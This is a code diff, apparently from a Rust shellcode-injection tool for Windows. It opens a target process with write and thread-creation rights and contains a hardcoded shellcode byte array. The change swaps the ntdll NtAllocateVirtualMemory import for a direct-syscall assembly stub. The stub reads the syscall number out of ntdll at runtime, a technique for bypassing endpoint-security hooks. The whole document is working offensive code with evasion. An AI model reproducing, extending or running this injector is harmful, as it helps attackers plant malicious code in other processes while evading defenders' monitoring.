@@ -29,6 +29,8 @@ pub struct OBJECT_ATTRIBUTES {
     SecurityDescriptor: *mut c_void,
     SecurityQualityOfService: *mut c_void,
 }
+#[unsafe(no_mangle)]
+pub static mut MN_NTAVM: u8 = 0x0;
 
 type HANDLE = *mut c_void;
 const MEM_COMMIT: u32 = 0x1000;
@@ -38,6 +40,17 @@ const PROCESS_VM_OPERATION: u32 = 0x0008;
 const PROCESS_VM_WRITE: u32 = 0x0020;
 const PROCESS_CREATE_THREAD: u32 = 0x0002;
 const PROCESS_QUERY_INFORMATION: u32 = 0x0400;
+
+unsafe extern "C" {
+    fn asm_NtAllocateVirtualMemory(
+        ProcessHandle: HANDLE,
+        BaseAddress: *mut *mut c_void,
+        ZeroBits: usize,
+        RegionSize: *mut usize,
+        AllocationType: u32,
+        Protect: u32,
+    ) -> NTSTATUS;
+}
 
 #[link(name = "ntdll")]
 unsafe extern "system" {
@@ -60,15 +73,6 @@ unsafe extern "system" {
         stack_size: usize,
         maximum_stack_size: usize,
         attribute_list: *mut c_void,
-    ) -> NTSTATUS;
-
-    pub fn NtAllocateVirtualMemory(
-        ProcessHandle: HANDLE,
-        BaseAddress: *mut *mut c_void,
-        ZeroBits: usize,
-        RegionSize: *mut usize,
-        AllocationType: u32,
-        Protect: u32,
     ) -> NTSTATUS;
 
     pub fn NtWriteVirtualMemory(
@@ -119,6 +123,8 @@ pub fn main() -> windows::core::Result<()> {
             | PROCESS_CREATE_THREAD
             | PROCESS_VM_OPERATION
             | PROCESS_QUERY_INFORMATION;
+        let ntdll_name = PCSTR(b"ntdll.dll\0".as_ptr());
+        let ntdll_handle = GetModuleHandleA(ntdll_name)?;
         let openprocess_status = NtOpenProcess(
             &mut h_process as *mut HANDLE,
             desired_access,
@@ -156,8 +162,6 @@ pub fn main() -> windows::core::Result<()> {
             0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83, 0x56, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9,
             0x41, 0xba, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5,
         ];
-        let ntdll_name = PCSTR(b"ntdll.dll\0".as_ptr());
-        let ntdll_handle = GetModuleHandleA(ntdll_name)?;
         let name_nt_allocate_virtual_memory = CString::new("NtAllocateVirtualMemory")
             .expect("CString convertion failed for NtAllocateVirtualMemory");
         let ntdll_nt_allocate_virtual_memory = GetProcAddress(
@@ -166,14 +170,11 @@ pub fn main() -> windows::core::Result<()> {
         )
         .expect("GetProcAddress failed for NtAllocateVirtualMemory");
         let addr_nt_allocate_virtual_memory = ntdll_nt_allocate_virtual_memory as *const u8;
-        let ssn_nt_allocate_virtual_memory: u8 = *addr_nt_allocate_virtual_memory.add(4);
-        println!(
-            "ssn allocate virtual memory {}",
-            *addr_nt_allocate_virtual_memory,
-        );
+        MN_NTAVM = *addr_nt_allocate_virtual_memory.add(4);
+
         let mut region_size: usize = shellcode.len() as usize;
         let mut remote_addr: *mut c_void = std::ptr::null_mut();
-        let allocation_status = NtAllocateVirtualMemory(
+        let allocation_status = asm_NtAllocateVirtualMemory(
             h_process,
             &mut remote_addr as *mut *mut c_void,
             0usize as usize,
